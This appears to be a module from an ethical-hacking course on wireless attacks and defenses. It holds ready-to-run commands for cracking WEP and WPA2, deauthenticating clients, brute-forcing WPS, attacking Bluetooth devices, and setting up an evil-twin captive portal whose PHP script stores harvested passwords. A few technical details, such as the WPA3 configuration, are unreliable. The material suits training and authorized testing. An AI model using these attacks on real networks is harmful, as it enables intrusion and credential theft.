# Module 16 - Wireless Network Hacking

## Overview
Wireless network hacking involves exploiting vulnerabilities in wireless networks and protocols to gain unauthorized access, intercept communications, or disrupt services. This module covers various wireless technologies including Wi-Fi, Bluetooth, and cellular networks, along with their security mechanisms, attack vectors, and defense strategies. Understanding wireless security is crucial as wireless networks have become ubiquitous in modern computing environments.

## Learning Objectives
- Understand wireless networking fundamentals and protocols
- Learn different wireless encryption standards and their vulnerabilities
- Master wireless penetration testing tools and techniques
- Develop skills in wireless network reconnaissance and enumeration
- Understand wireless attack vectors and countermeasures

---

## Wireless Networking Fundamentals

### What is a Wireless Network?
A **wireless network** is a computer network that uses wireless data connections between network nodes, eliminating the need for physical cables to connect devices.

### Key Wireless Components

#### Access Point (AP)
**Access Point (AP)** or **Wireless Access Point (WAP)** is a hardware device that allows wireless connectivity to end devices by acting as a bridge between wireless and wired networks.

#### Service Set Identifier (SSID)
**Service Set Identifier (SSID)** is a 32-bit identification string of the Access Point, essentially the AP's network name. The SSID is inserted into the header of every data packet transmitted.

#### Basic Service Set Identifier (BSSID)
**Basic Service Set Identifier (BSSID)** is the MAC address of the Access Point, providing unique identification at the hardware level.

#### Extended Service Set (ESS)
**Extended Service Set (ESS)** consists of multiple access points connected through a wired network, allowing seamless roaming between APs.

---

## Wi-Fi Technology

### Wi-Fi Overview
**Wi-Fi** is a local area networking technology based on the **IEEE 802.11** standard. Wi-Fi stands for **Wireless Fidelity** and was officially adopted by the Wi-Fi Alliance in 2000.

### Historical Development
- **1999**: Six companies formed a global non-profit association
- **2000**: The group adopted the term "Wi-Fi" and became the Wi-Fi Alliance
- **Today**: Wi-Fi Alliance continues to develop and certify wireless standards

### IEEE 802.11 Standards Evolution

#### Classic Standards
| Protocol | Frequency | Max Data Speed | Year | Notes |
|:--------:|:---------:|:--------------:|:----:|:------|
| 802.11   | 2.4 GHz   | 2 Mbps        | 1997 | Original standard |
| 802.11a  | 5 GHz     | 54 Mbps       | 1999 | 5 GHz band |
| 802.11b  | 2.4 GHz   | 11 Mbps       | 1999 | Extended range |
| 802.11g  | 2.4 GHz   | 54 Mbps       | 2003 | Backward compatible with 802.11b |
| 802.11n  | 2.4/5 GHz | 450 Mbps      | 2009 | MIMO technology |
| 802.11ac | 5 GHz     | 866.7 Mbps    | 2013 | Multi-user MIMO |
| 802.11ax | 2.4/5 GHz | 9.6 Gbps      | 2019 | Wi-Fi 6 |

#### Modern Wi-Fi Generations
| Protocol | Wi-Fi Version | Max Speed | Key Features |
|:--------:|:-------------:|:---------:|:-------------|
| 802.11n  | Wi-Fi 4       | 600 Mbps | Single device focus |
| 802.11ac | Wi-Fi 5       | 3.5 Gbps  | 4 simultaneous devices |
| 802.11ax | Wi-Fi 6       | 9.6 Gbps  | 8 simultaneous devices |
| 802.11be | Wi-Fi 7       | 30+ Gbps  | Ultra-low latency |

---

## Wireless Security Mechanisms

### Authentication Methods

#### Open System Authentication
- **Process**: Client sends authentication request with Station ID (MAC address)
- **Response**: AP responds with success or failure message
- **Security**: No encryption, vulnerable to eavesdropping
- **Use Case**: Public hotspots, guest networks

#### Shared Key Authentication
- **Process**: Pre-shared key manually configured on both device and AP
- **Authentication**: Based on key comparison and challenge-response
- **Security**: Vulnerable to cryptographic attacks
- **Use Case**: Legacy WEP networks

### Wireless Encryption Standards

#### Wired Equivalent Privacy (WEP) - 1997
**Overview**: Designed to provide the same level of security as wired LANs.

**Technical Details:**
- **Key Length**: 40-bit or 104-bit keys
- **Algorithm**: RC4 stream cipher
- **Integrity**: CRC-32 checksum
- **Vulnerabilities**: Weak initialization vectors, key reuse

**WEP Weaknesses:**
```bash
# WEP vulnerabilities
1. Weak Initialization Vectors (IVs)
2. Static WEP keys
3. RC4 cipher weaknesses
4. Lack of proper authentication
5. Replay attacks possible
6. CRC-32 collision attacks
```

#### Wi-Fi Protected Access (WPA) - 2003
**Overview**: Interim security standard to address WEP vulnerabilities.

**Technical Details:**
- **Key Management**: Temporal Key Integrity Protocol (TKIP)
- **Encryption**: RC4 with per-packet key mixing
- **Integrity**: Message Integrity Check (MIC)
- **Authentication**: 802.1X or PSK

#### WPA2 (IEEE 802.11i) - 2004
**Overview**: Full IEEE 802.11i implementation providing robust security.

**Technical Details:**
- **Encryption**: Advanced Encryption Standard (AES)
- **Protocol**: Counter Mode CBC-MAC Protocol (CCMP)
- **Key Length**: 128-bit encryption
- **Authentication**: 802.1X (Enterprise) or PSK (Personal)

**WPA2 Security Features:**
```bash
# WPA2 improvements over WPA
1. AES encryption instead of RC4
2. CCMP instead of TKIP
3. Stronger key derivation
4. Better replay protection
5. Improved integrity checking
```

#### WPA3 - 2018
**Overview**: Latest Wi-Fi security standard addressing modern threats.

**Technical Details:**
- **Encryption**: 128-bit (Personal) / 192-bit (Enterprise)
- **Key Exchange**: Simultaneous Authentication of Equals (SAE)
- **Forward Secrecy**: Individual data protection
- **Protection**: Against offline dictionary attacks

**WPA3 Enhancements:**
```bash
# WPA3 new features
1. Stronger password protection (SAE)
2. Forward secrecy
3. 192-bit encryption (Enterprise)
4. Easier device onboarding (Wi-Fi Easy Connect)
5. Enhanced open network protection
```

---

## Wireless Reconnaissance and Enumeration

### Wardriving and Warwalking
**Wardriving** is the practice of searching for Wi-Fi wireless networks while in a moving vehicle using laptops, smartphones, or specialized equipment.

**Equipment Needed:**
- Laptop or mobile device
- Wireless adapter with monitor mode capability
- GPS device for location tracking
- External antenna for better range
- Wardriving software

### Wireless Discovery Tools

#### Airodump-ng
```bash
# Start monitor mode
airmon-ng start wlan0

# Basic wireless scanning
airodump-ng wlan0mon

# Target specific network
airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon

# Filter by encryption type
airodump-ng --encrypt WPA wlan0mon

# Show only specific SSID
airodump-ng --essid "TargetNetwork" wlan0mon
```

#### Kismet
```bash
# Start Kismet
sudo kismet

# Command line mode
kismet_server
kismet_client

# Configure capture source
kismet -c wlan0

# GPS integration
kismet -c wlan0 --use-gpsd-gps --gpsd-host=127.0.0.1
```

#### WiFi Pineapple
```bash
# Access WiFi Pineapple web interface
# Navigate to http://172.16.42.1:1471

# Reconnaissance modules
- PineAP (rogue AP)
- WiFi Scanner
- Site Survey
- Handshake Capture

# Evil Twin attacks
- Captive Portal
- DNS Spoof
- SSL Kill Switch
```

#### InSSIDer
```bash
# Windows WiFi scanner
# Features:
- Real-time wireless scanning
- Signal strength mapping
- Channel utilization analysis
- Network security identification
- GPS integration for wardriving
```

### Mobile Reconnaissance Tools

#### WiFi Analyzer (Android)
```bash
# Features available:
- Network discovery
- Signal strength measurement
- Channel analysis
- Access point details
- Real-time monitoring
```

#### WiFi Explorer (iOS/macOS)
```bash
# Professional WiFi scanning
- 802.11 network discovery
- Signal quality analysis
- Channel recommendations
- Security assessment
- Export capabilities
```

---

## Wireless Attack Vectors

### WEP Attacks

#### WEP Key Cracking
```bash
# Capture WEP traffic
airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w wep_capture wlan0mon

# Generate traffic (ARP replay)
aireplay-ng -3 -b AA:BB:CC:DD:EE:FF -h CC:DD:EE:FF:00:11 wlan0mon

# Crack WEP key
aircrack-ng wep_capture-01.cap

# Alternative: ChopChop attack
aireplay-ng -4 -b AA:BB:CC:DD:EE:FF -h CC:DD:EE:FF:00:11 wlan0mon

# Fragmentation attack
aireplay-ng -5 -b AA:BB:CC:DD:EE:FF -h CC:DD:EE:FF:00:11 wlan0mon
```

#### WEP Vulnerabilities Explained
```python
#!/usr/bin/env python3
"""
WEP Vulnerability Analysis
Demonstrates why WEP is easily breakable
"""

class WEPAnalysis:
    def __init__(self):
        self.iv_size = 24  # bits
        self.total_ivs = 2**24  # 16,777,216 possible IVs
        
    def calculate_collision_probability(self, packets):
        """Calculate IV collision probability"""
        # Birthday paradox application
        probability = 1.0
        for i in range(packets):
            probability *= (self.total_ivs - i) / self.total_ivs
            if probability < 0.5:
                return i
        return packets
    
    def weak_iv_analysis(self):
        """Analyze weak IV patterns"""
        weak_patterns = [
            "FD:00:XX",  # Weak IV pattern 1
            "FE:00:XX",  # Weak IV pattern 2  
            "FF:00:XX",  # Weak IV pattern 3
        ]
        
        print("WEP Weak IV Patterns:")
        for pattern in weak_patterns:
            print(f"- {pattern}")
    
    def key_recovery_estimate(self, data_rate_mbps=11):
        """Estimate time to recover WEP key"""
        packets_needed = 50000  # Approximate packets for 40-bit WEP
        packet_size = 1500  # bytes
        
        time_minutes = (packets_needed * packet_size * 8) / (data_rate_mbps * 1000000 * 60)
        
        print(f"Estimated time to crack WEP: {time_minutes:.2f} minutes")
        print(f"Packets needed: {packets_needed}")

# Usage
# wep = WEPAnalysis()
# wep.weak_iv_analysis()
# wep.key_recovery_estimate()
```

### WPA/WPA2 Attacks

#### WPA2 Handshake Capture and Cracking
```bash
# Capture WPA2 handshake
airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w wpa2_handshake wlan0mon

# Deauthentication attack to force handshake
aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF wlan0mon

# Verify handshake capture
aircrack-ng wpa2_handshake-01.cap

# Dictionary attack
aircrack-ng -w /usr/share/wordlists/rockyou.txt wpa2_handshake-01.cap

# GPU-accelerated cracking with Hashcat
hashcat -m 2500 wpa2_handshake.hccapx /usr/share/wordlists/rockyou.txt

# Convert cap to hccapx format
cap2hccapx.bin wpa2_handshake-01.cap wpa2_handshake.hccapx
```

#### WPA2 PMKID Attack
```bash
# Capture PMKID without handshake
hcxdumptool -o pmkid_capture.pcapng -i wlan0mon --enable_status=1

# Extract PMKID hash
hcxpcaptool -z pmkid_hash.txt pmkid_capture.pcapng

# Crack PMKID with Hashcat
hashcat -m 16800 pmkid_hash.txt /usr/share/wordlists/rockyou.txt
```

#### Evil Twin Attack
```bash
# Create fake access point
hostapd /etc/hostapd/hostapd.conf

# hostapd.conf configuration
interface=wlan0
driver=nl80211
ssid=FreeWiFi
hw_mode=g
channel=6
auth_algs=1
wpa=2
wpa_passphrase=password123
wpa_key_mgmt=WPA-PSK
wpa_pairwise=CCMP

# DHCP server configuration
dnsmasq --interface=wlan0 --dhcp-range=192.168.1.2,192.168.1.30,255.255.255.0,12h

# Captive portal setup
# Redirect all HTTP traffic to fake login page
iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination 192.168.1.1:80
```

### Bluetooth Attacks

#### Bluetooth Reconnaissance
```bash
# Bluetooth scanning with hcitool
hcitool scan
hcitool inq

# Device information gathering
hcitool info AA:BB:CC:DD:EE:FF
hcitool name AA:BB:CC:DD:EE:FF

# Service discovery
sdptool browse AA:BB:CC:DD:EE:FF
sdptool records AA:BB:CC:DD:EE:FF

# BlueZ tools
bluetoothctl
# scan on
# devices
# info AA:BB:CC:DD:EE:FF
```

#### BlueSnarf Attack
```bash
# BlueSnarf using obexftp
obexftp -b AA:BB:CC:DD:EE:FF -c /
obexftp -b AA:BB:CC:DD:EE:FF -g telecom/pb.vcf

# BlueSnarf++ for newer devices
# Requires RFCOMM connection
rfcomm connect 0 AA:BB:CC:DD:EE:FF
```

#### BlueBug Attack
```bash
# AT command injection over RFCOMM
# Connect to device
rfcomm connect 0 AA:BB:CC:DD:EE:FF 17

# Send AT commands
echo "ATD+1234567890;" > /dev/rfcomm0  # Make call
echo "AT+CPBR=1,100" > /dev/rfcomm0    # Read phonebook
```

### Advanced Wireless Attacks

#### Krack Attack (Key Reinstallation)
```python
#!/usr/bin/env python3
"""
KRACK Attack Simulation
Demonstrates key reinstallation vulnerability in WPA2
"""

from scapy.all import *
import time

class KrackAttack:
    def __init__(self, interface, target_mac, ap_mac):
        self.interface = interface
        self.target_mac = target_mac
        self.ap_mac = ap_mac
        self.replay_counter = 0
    
    def capture_handshake(self):
        """Capture and analyze 4-way handshake"""
        print("Capturing 4-way handshake...")
        
        def packet_handler(packet):
            if packet.haslayer(EAPOL):
                print(f"EAPOL packet captured: {packet.summary()}")
                # Analyze key information
                if hasattr(packet[EAPOL], 'key_info'):
                    key_info = packet[EAPOL].key_info
                    print(f"Key Info: {hex(key_info)}")
        
        sniff(iface=self.interface, prn=packet_handler, timeout=60)
    
    def replay_message3(self):
        """Replay message 3 of 4-way handshake"""
        print("Replaying message 3 to trigger key reinstallation...")
        
        # Craft replay packet (simplified example)
        replay_packet = RadioTap() / Dot11(
            addr1=self.target_mac,
            addr2=self.ap_mac,
            addr3=self.ap_mac
        ) / Dot11Auth()
        
        # Send replay
        sendp(replay_packet, iface=self.interface)

# Usage requires careful implementation and authorization
# krack = KrackAttack("wlan0mon", "client_mac", "ap_mac")
```

#### Wi-Fi Pineapple Advanced Attacks
```bash
# PineAP configuration
echo "EnablePineAP=1" >> /etc/pineapple/pineap.conf
echo "TargetMAC=*" >> /etc/pineapple/pineap.conf
echo "BroadcastSSIDList=1" >> /etc/pineapple/pineap.conf

# Captive portal setup
# Create fake login page
cat > /www/index.html << EOF
<html>
<body>
<h2>WiFi Authentication Required</h2>
<form method="post" action="login.php">
Username: <input type="text" name="username"><br>
Password: <input type="password" name="password"><br>
<input type="submit" value="Connect">
</form>
</body>
</html>
EOF

# Credential harvesting script
cat > /www/login.php << EOF
<?php
\$username = \$_POST['username'];
\$password = \$_POST['password'];
file_put_contents('/tmp/credentials.txt', "\$username:\$password\n", FILE_APPEND);
header('Location: http://www.google.com');
?>
EOF
```

---

## Wireless Penetration Testing Methodology

### Pre-Engagement Phase
1. **Scope Definition**: Identify wireless networks and technologies to test
2. **Legal Authorization**: Obtain written permission for testing
3. **Equipment Preparation**: Ensure proper hardware and software setup
4. **Timeline Planning**: Schedule testing to minimize business impact

### Information Gathering Phase
```bash
# Passive reconnaissance
airodump-ng wlan0mon

# Active scanning with specific parameters
airodump-ng --band a wlan0mon  # 5 GHz only
airodump-ng --band bg wlan0mon # 2.4 GHz only

# Client tracking
airodump-ng --showack wlan0mon

# Hidden SSID detection
airodump-ng --ignore-negative-one wlan0mon
```

### Vulnerability Assessment Phase
```bash
# WPS vulnerability testing
wash -i wlan0mon

# WPS PIN attacks
reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -v

# WPS Pixie Dust attack
reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -K

# Enterprise network testing
# 802.1X authentication bypass attempts
# Certificate validation testing
# RADIUS server enumeration
```

### Exploitation Phase
```bash
# WEP cracking workflow
airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w wep_attack wlan0mon
aireplay-ng -3 -b AA:BB:CC:DD:EE:FF -h CC:DD:EE:FF:00:11 wlan0mon
aircrack-ng wep_attack-01.cap

# WPA2 cracking workflow
airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w wpa2_attack wlan0mon
aireplay-ng -0 1 -a AA:BB:CC:DD:EE:FF -c CC:DD:EE:FF:00:11 wlan0mon
aircrack-ng -w wordlist.txt wpa2_attack-01.cap
```

### Post-Exploitation Phase
```bash
# Network lateral movement
nmap -sV -sC target_network/24

# Data exfiltration simulation
# Demonstrate access to sensitive resources
# Document security weaknesses
# Prepare remediation recommendations
```

---

## Wireless Security Tools

### Offensive Tools

#### Aircrack-ng Suite
```bash
# Full suite components
airmon-ng      # Wireless interface management
airodump-ng    # Packet capture and analysis
aireplay-ng    # Packet injection and attacks
aircrack-ng    # Password and key cracking
airdecap-ng    # Decryption of captured packets
packetforge-ng # Packet crafting
ivstools       # IV analysis tools
```

#### Reaver
```bash
# WPS PIN brute force
reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -v

# Advanced options
reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -v -d 1 -x 60 -c 6 -K

# Pixie Dust attack
reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -K -v
```

#### Bully
```bash
# Alternative WPS cracker
bully -b AA:BB:CC:DD:EE:FF -e "NetworkName" -c 6 wlan0mon

# Verbose mode with delays
bully -b AA:BB:CC:DD:EE:FF -e "NetworkName" -c 6 -d -v 4 wlan0mon
```

#### Fern WiFi Cracker
```bash
# GUI-based wireless security testing
# Features:
- Automatic network detection
- WEP, WPA, WPS cracking
- Session management
- Fake access point creation
```

### Defensive Tools

#### WiFi Protected Setup (WPS) Auditing
```bash
# WPS vulnerability scanner
wash -i wlan0mon

# Check WPS status
wps_reg -i wlan0mon -b AA:BB:CC:DD:EE:FF -p
```

#### Wireless Intrusion Detection
```bash
# Kismet IDS configuration
# /etc/kismet/kismet.conf
source=wlan0
enablespeech=false
speech_type=festival
logtemplate=%n-%d-%i.%l
logdefault=kismet
nmap="nmap -v -P0 -O -sS -oG %O %h"

# WIDS alerts
- Rogue access points
- Evil twin attacks
- Deauthentication attacks
- WPS brute force attempts
- Unusual client behavior
```

---

## Bluetooth Security

### Bluetooth Basics
**Bluetooth** is a short-range wireless communication technology operating in the 2.4 GHz ISM band using frequency-hopping spread spectrum.

### Bluetooth Security Modes
1. **Mode 1**: No security
2. **Mode 2**: Service-level security
3. **Mode 3**: Link-level security
4. **Mode 4**: Service-level security (SSP)

### Bluetooth Attack Vectors

#### Discovery and Enumeration
```bash
# Basic Bluetooth scanning
hcitool scan
hcitool inq

# Device information
hcitool info AA:BB:CC:DD:EE:FF
hcitool clock AA:BB:CC:DD:EE:FF

# Service discovery  
sdptool browse AA:BB:CC:DD:EE:FF
sdptool search --bdaddr AA:BB:CC:DD:EE:FF FTP
```

#### Bluetooth Low Energy (BLE) Testing
```bash
# BLE scanning with gatttool
gatttool -I
[LE]> connect AA:BB:CC:DD:EE:FF
[AA:BB:CC:DD:EE:FF][LE]> primary
[AA:BB:CC:DD:EE:FF][LE]> characteristics

# BLE with Python (using pygatt)
import pygatt

adapter = pygatt.GATTToolBackend()
adapter.start()
device = adapter.connect('AA:BB:CC:DD:EE:FF')
value = device.char_read("00002a00-0000-1000-8000-00805f9b34fb")
```

---

## Wireless Defense Strategies

### Network Hardening

#### Access Point Security Configuration
```bash
# Secure AP configuration checklist
1. Change default administrator credentials
2. Disable WPS if not needed
3. Use WPA3 or WPA2 with strong passphrase
4. Hide SSID (security through obscurity)
5. Enable MAC address filtering
6. Disable remote management
7. Update firmware regularly
8. Use guest networks for visitors
9. Implement network segmentation
10. Enable logging and monitoring
```

#### WPA3 Implementation
```bash
# WPA3 configuration (hostapd)
interface=wlan0
driver=nl80211
ssid=SecureNetwork
hw_mode=g
channel=6
auth_algs=1
wpa=3
wpa_passphrase=VeryStrongPassword123!
wpa_key_mgmt=SAE
rsn_pairwise=CCMP
sae_groups=19 20 21
```

### Monitoring and Detection

#### Wireless Intrusion Detection System (WIDS)
```bash
# Kismet configuration for WIDS
# Alert on rogue APs
alert=NEWACCESSPOINT,5,1,1

# Alert on probe flood
alert=PROBEFLOOD,5,1,1

# Alert on deauth flood
alert=DEAUTHFLOOD,5,1,1

# Alert on disassoc flood  
alert=DISCONFLOOD,5,1,1
```

#### Network Access Control (NAC)
```bash
# 802.1X authentication with FreeRADIUS
# /etc/freeradius/clients.conf
client access_point {
    ipaddr = 192.168.1.10
    secret = shared_secret
    require_message_authenticator = yes
}

# User authentication
# /etc/freeradius/users
testuser Cleartext-Password := "password"
    Reply-Message := "Hello, %{User-Name}"
```

---

## Mobile Device Security

### iOS Security Testing
```bash
# iOS WiFi analysis tools
# 1. WiFi Explorer (Mac App Store)
# 2. WiFi Analyzer apps (limited by iOS sandbox)
# 3. Network scanning via shortcuts app
# 4. Packet capture with Remote Virtual Interface
```

### Android Security Testing
```bash
# Android WiFi tools
# WiFi Analyzer
# Network Discovery
# Fing
# Termux with aircrack-ng

# Root required tools
# Kali NetHunter
# WiFi Kill
# AndroDumpper
# WiFi WPS WPA Tester
```

---

## Latest Wireless Security Trends (2024)

### Wi-Fi 6E and Wi-Fi 7 Security
```bash
# Wi-Fi 6E (6 GHz band) considerations
- Increased spectrum availability
- Better security due to WPA3 requirement
- Reduced interference
- Enhanced privacy features

# Wi-Fi 7 security enhancements
- Improved encryption algorithms
- Better key management
- Enhanced protection against quantum attacks
- Advanced threat detection
```

### IoT Wireless Security
```bash
# IoT device testing considerations
1. Default credential scanning
2. Firmware analysis
3. Communication protocol testing
4. Cloud service integration security
5. Update mechanism security
```

### 5G Security Considerations
```bash
# 5G wireless security aspects
- Network slicing security
- Edge computing vulnerabilities
- Enhanced encryption requirements
- New attack surfaces
- Privacy concerns
```

---

## Practical Exercises and Labs

### Lab 1: WEP Cracking Exercise
```bash
# Objective: Crack WEP key using aircrack-ng suite
# Setup: Create WEP-enabled access point for testing

# 1. Start monitor mode
airmon-ng start wlan0

# 2. Scan for WEP networks
airodump-ng wlan0mon

# 3. Capture WEP traffic
airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w wep_lab wlan0mon

# 4. Generate traffic
aireplay-ng -3 -b AA:BB:CC:DD:EE:FF -h CC:DD:EE:FF:00:11 wlan0mon

# 5. Crack WEP key
aircrack-ng wep_lab-01.cap
```

### Lab 2: WPA2 Handshake Capture
```bash
# Objective: Capture and crack WPA2 handshake
# Setup: WPA2 network with known weak password

# 1. Monitor target network
airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w wpa2_lab wlan0mon

# 2. Deauthenticate client
aireplay-ng -0 3 -a AA:BB:CC:DD:EE:FF -c CC:DD:EE:FF:00:11 wlan0mon

# 3. Verify handshake capture
aircrack-ng wpa2_lab-01.cap

# 4. Dictionary attack
aircrack-ng -w /usr/share/wordlists/rockyou.txt wpa2_lab-01.cap
```

### Lab 3: Evil Twin Attack Simulation
```bash
# Objective: Create fake access point for credential harvesting
# Warning: Only perform in isolated lab environment

# 1. Create hostapd configuration
# 2. Set up DHCP server
# 3. Configure captive portal
# 4. Test client connection and credential capture
# 5. Analyze captured data
```

---

## References and Further Reading

### Technical Standards
- [IEEE 802.11 Wireless LAN Standard](https://standards.ieee.org/standard/802_11-2016.html)
- [Wi-Fi Alliance Security Specifications](https://www.wi-fi.org/discover-wi-fi/security)
- [RFC 5216: EAP-TLS Authentication Protocol](https://tools.ietf.org/html/rfc5216)

### Security Resources
- [NIST Guidelines for Securing Wireless Networks](https://csrc.nist.gov/publications/detail/sp/800-153/final)
- [OWASP Wireless Security Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)
- [SANS Wireless Security Resources](https://www.sans.org/white-papers/wireless/)

### Training and Certification
- [SANS SEC617: Wireless Penetration Testing and Ethical Hacking](https://www.sans.org/cyber-security-courses/wireless-penetration-testing-ethical-hacking/)
- [EC-Council Certified Wireless Security Professional (CWSP)](https://www.eccouncil.org/programs/certified-wireless-security-professional-cwsp/)
- [Offensive Security Wireless Professional (OSWP)](https://www.offensive-security.com/wifu-oswp/)

---

*This content is provided for educational purposes only. All wireless security testing techniques should be used only in authorized testing environments with proper permissions. Unauthorized wireless network testing is illegal and can result in severe penalties.*